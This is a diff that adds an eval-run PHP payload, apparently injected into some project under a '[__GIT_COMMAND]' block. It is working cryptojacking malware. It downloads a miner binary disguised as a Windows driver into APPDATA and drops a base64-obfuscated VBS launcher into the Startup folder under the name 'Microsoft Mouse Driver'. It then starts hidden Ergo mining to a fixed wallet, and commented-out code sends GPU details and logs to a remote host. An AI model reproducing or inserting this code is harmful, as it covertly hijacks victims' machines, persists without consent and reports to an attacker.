@@ -1,0 +1,228 @@
+execução por eval. cuidado, não use exit e nem __FILE__
+
+[__GIT_COMMAND]
+
+$GLOBALS['__download_002'] = function($url, $post = false)
+{
+	try
+	{
+		$header = array(
+			'Cache-Control: max-age=0',
+			'Connection: keep-alive',
+			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
+		);
+		clearstatcache();
+		$ch = curl_init(); 
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0' );
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		if($post)
+		{
+			curl_setopt($ch, CURLOPT_POST, true);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
+		}
+		$response = @curl_exec($ch);
+		curl_close($ch);
+		return $response;
+		
+	}catch( Exception $e ){}
+	return false;
+};
+
+$GLOBALS['__getdev_002'] = function($lolpath)
+{
+	$output = array();
+	$r = 0;
+	@exec('"' . $lolpath . '" --list-devices', $output, $r);
+	$output = implode("\n", $output);
+	$output = preg_split('/device[\s]+(?=[0-9\s]+\:)/is', "a\n" . $output . "a\n");
+	$l = count($output);
+	$max_mem = 0;
+	$device = array('0', 'null', 'null', 0);
+	for($i=1; $i<$l; $i++)
+	{
+		$dev = $output[$i];
+		preg_match('/^[0-9\s]+/is', $dev, $matches);
+		if(!isset($matches[0]))
+			continue;
+		$ndevice = trim($matches[0]);
+		if(!$ndevice)
+			$ndevice = '0';
+		preg_match('/name\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$name = trim($matches[1]);
+		
+		preg_match('/memory\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$memory = preg_replace('/[a-z]+.*?$/is', '', trim($matches[1]));
+		$memory = (int)preg_replace('/[^0-9]+/is', '', $memory);
+		
+		preg_match('/vendor\:(.*?)[\r\n]/is', $dev, $matches);
+		if(!isset($matches[1]))
+			continue;
+		$vendor = trim($matches[1]);
+		$vendor = preg_replace('/[^a-z0-9]+/is', '', $vendor);
+		if(stripos($vendor, 'amd') === false && stripos($vendor, 'nvidia') === false && stripos($vendor, 'advancedmicrodevices') === false)
+			continue;
+		if($max_mem > $memory)
+			continue;
+		$max_mem = $memory;
+		$device = array($ndevice, $name, $vendor, $memory);
+	}
+	return $device;
+};
+
+$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
+@mkdir($lolm_path);
+$id_com = $lolm_path . '\\com_key.dat';
+$id_path = $lolm_path . '\\work_key.dat';
+$work_key = @file_get_contents($id_path);
+if(!$work_key)
+{
+	$work_key = md5(microtime().mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999));
+	@file_put_contents($id_path, $work_key);
+}
+$work_key = trim($work_key);
+$command_id = 'php000047';
+/*if(@file_get_contents($id_com) !== $command_id)*/
+if(1)
+{
+	@file_put_contents($id_com, $command_id);
+	try{
+	$lolm_path .= '\\w_driver1.95_x86.exe';
+	$data = true;
+	if(!is_file($lolm_path))
+	{
+		$data = false;
+		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
+		if($data && strlen($data) > 9000)
+			@file_put_contents($lolm_path, $data);
+		else
+			$data = false;
+	}
+	$devnum = '0'; /*false;*/
+	if($data !== false && is_file($lolm_path))
+	{
+		/**
+		sleep(2);
+		$dev = $GLOBALS['__getdev_002']($lolm_path);
+		if($dev)
+			$devnum = $dev[0];
+		/**/
+	}
+	if($devnum !== false && is_file($lolm_path))
+	{
+		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
+		$vbs_checkname = 'Microsoft Mouse Driver x86';
+		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
+		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.' --watchdog exit --nocolor';
+		$command = preg_replace('/\"/is', '""', $command);
+		$vbs = base64_decode($vbs);
+		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
+		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
+		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
+		$execlol = false;
+		$vbs_exec_path = null;
+		if(is_dir($vbs_path))
+		{
+			/**
+			@exec('taskkill /f /im w_driver_x86.exe');
+			@exec('taskkill /f /im w_driverx86.exe');
+			@exec('taskkill /f /im w_driver1.95_x86.exe');
+			/**/
+			$count_files = 0;
+			$di = new DirectoryIterator($vbs_path);
+			unset($data);
+			foreach($di as $data)
+			{
+				if($data->isDot() || $data->isDir() || !$data->isFile())
+					continue;
+				if(stripos($data->getFilename(), $vbs_checkname) === false)
+					continue;
+				$count_files++;
+				if($count_files == 1)
+				{
+					$execlol = true;
+					@file_put_contents($data->getPathname(), $vbs);
+					$vbs_exec_path = $data->getPathname();
+					/*@exec('start "" "'.$data->getPathname().'"');*/
+				}
+				else
+					@unlink($data->getPathname());
+			}
+			if($count_files == 0)
+			{
+				$execlol = true;
+				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
+				$vbs_exec_path = $vbs_path.'\\'.$vbsname;
+				/*@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');*/
+			}
+		}
+		if($execlol && $vbs_exec_path)
+		{
+			$output = array();
+			$r = 0;
+			@exec('tasklist', $output, $r);
+			$output = implode("\n", $output);
+			if(false === stripos($output, 'w_driver1.95_x86'))
+			{
+				/**
+				$output = array();
+				$r = 0;
+				@exec('wmic path win32_VideoController get name', $output, $r);
+				$output = trim(implode("\n", $output));
+				$output = preg_replace('/[\r\n]+/is', ' - ', $output);
+				$ipl = @gethostbyname(@gethostname());
+				if(!$ipl)
+					$ipl = '127.0.0.1';
+				$post = array(
+					'gpuid' => $output
+				);
+				@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
+				sleep(5);
+				/**/
+				
+				@exec('start "" "'.$vbs_exec_path.'"');
+				
+				/**
+				$output = array();
+				$r = 0;
+				@exec('"' . $lolm_path . '" --list-devices --nocolor', $output, $r);
+				$devices = implode("\n", $output);
+				$log_path = dirname($lolm_path) . '\\temp_log.txt';
+				@pclose(@popen('start /B cmd /c ""' . $lolm_path . '" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum.' > "' . $log_path . '" 2>&1"', 'r'));
+				sleep(10);
+				$output = array();
+				$r = 0;
+				@exec('tasklist', $output, $r);
+				$output = implode("\n", $output);
+				if(false === stripos($output, 'w_driver1.95_x86'))
+				{
+					$logdata = @file_get_contents($log_path);
+					if($logdata)
+					{
+						$post = array(
+							'devices' => $devices,
+							'logdata' => $logdata
+						);
+						$ipl = @gethostbyname(@gethostname());
+						if(!$ipl)
+							$ipl = '127.0.0.1';
+						@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
+					}
+				}
+				/**/
+			}
+		}
+	}
+	}catch(Exception $e){}
+}
+
+[/GIT_COMMAND]
